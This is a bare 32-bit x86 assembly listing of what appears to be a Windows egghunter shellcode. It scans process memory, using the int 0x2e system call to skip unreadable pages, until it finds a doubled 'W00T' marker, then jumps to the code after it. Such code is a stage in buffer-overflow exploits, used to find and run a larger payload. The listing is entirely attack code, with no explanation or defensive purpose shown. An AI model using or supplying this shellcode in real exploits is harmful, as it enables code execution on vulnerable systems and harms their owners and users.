[BITS 32]
xor edx, edx
or dx,0xfff
inc edx
push edx
push byte +0x2
pop eax
int 0x2e
push byte 0x04
pop ebx
inc ebx
cmp al,bl
pop edx
jz short 0x0
mov eax,0x57303054
mov edi,edx
scasd
jnz short 0x5
scasd
jnz short 0x5
jmp edi
